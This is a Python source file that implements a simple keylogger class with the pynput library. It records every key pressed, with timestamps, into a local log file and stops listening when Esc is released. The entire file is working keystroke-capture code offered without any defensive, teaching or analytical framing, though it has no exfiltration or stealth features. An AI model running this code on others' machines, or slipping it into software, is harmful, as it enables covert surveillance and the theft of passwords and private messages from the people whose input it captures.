import pynput
from pynput.keyboard import Key, Listener
import logging

class KeyLogger:
    def __init__(self, log_file='key_log.txt'):
        """
        Initialize the Keylogger with a log file.

        Parameters:
            log_file (str): The file where keystrokes will be logged.
        """

        self.log_file = log_file
        self._setup_logging()
        self.listener = None

    def _setup_logging(self):
        # Configure the logging settings
        logging.basicConfig(
            filename = self.log_file,
            level = logging.DEBUG,
            format = '%(asctime)s: %(message)s',
        )

        self.listener = None

    def on_press(self, key):
        """
        Callback function to be called when a key is pressed.

        Parameters:
            key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed
        """
        try:
            logging.info(f'Key {key.char} pressed')
        except AttributeError:
            logging.info(f'Special key {key} pressed')
    
    def on_release(self, key):
        """
        Callback function to be called when a ket is released.

        Parameters:
            key (pynput.keyboard.Key or pynput.keyboard.KeyCode): They key that was released
        """
        if key == Key.esc:
            # Stop listener if the escape key is released.
            return False
    
    def start(self):
        # Start the keylogging listener
        self.listener = Listener(on_press = self.on_press, on_release = self.on_release)
        self.listener.start()
    
    def stop(self):
        # Stop the keylogging listener if it is running
        if self.listener is not None:
            self.listener.stop()
            self.listener = None